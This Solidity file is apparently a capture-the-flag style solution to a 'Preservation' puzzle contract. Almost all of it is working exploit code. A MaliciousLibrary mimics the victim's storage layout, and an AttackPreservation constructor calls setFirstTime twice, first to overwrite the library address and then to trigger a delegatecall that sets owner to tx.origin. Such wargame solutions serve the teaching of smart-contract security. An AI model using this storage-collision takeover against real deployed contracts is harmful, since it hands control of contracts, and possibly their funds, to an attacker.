pragma solidity ^0.8.10;

contract MaliciousLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint) public {
        owner=tx.origin;
    }
}

interface IPreservation {    
    function owner() external returns(address);
    function setFirstTime(uint _timeStamp) external;     
}

contract AttackPreservation {
    address public victim;
    IPreservation public p;    
    MaliciousLibrary public m;

    constructor(address _victim) { 
        victim = _victim;   
        m = new MaliciousLibrary();                        
        p = IPreservation(victim);
        p.setFirstTime(uint256(uint160(address(m))));
        p.setFirstTime(0);
    }
}